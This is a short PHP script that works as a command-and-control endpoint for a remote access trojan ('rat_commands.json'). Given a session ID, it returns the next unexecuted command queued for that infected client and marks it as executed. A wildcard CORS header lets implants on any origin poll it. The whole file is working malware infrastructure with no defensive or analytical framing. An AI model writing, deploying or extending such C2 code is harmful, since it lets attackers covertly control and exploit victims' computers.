<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

if (!isset($_GET['session'])) {
    echo json_encode(['success' => false, 'error' => 'No session']);
    exit;
}

$sessionId = $_GET['session'];

if (!file_exists('data/rat_commands.json')) {
    echo json_encode(['success' => true, 'command' => null]);
    exit;
}

$commands = json_decode(file_get_contents('data/rat_commands.json'), true);

if (!$commands || !isset($commands['commands'])) {
    echo json_encode(['success' => true, 'command' => null]);
    exit;
}

// Find command for this session
foreach ($commands['commands'] as $key => $cmd) {
    if ($cmd['session'] === $sessionId && !$cmd['executed']) {
        // Mark as executed
        $commands['commands'][$key]['executed'] = true;
        file_put_contents('data/rat_commands.json', json_encode($commands, JSON_PRETTY_PRINT));
        
        echo json_encode(['success' => true, 'command' => $cmd['command']]);
        exit;
    }
}

echo json_encode(['success' => true, 'command' => null]);
?>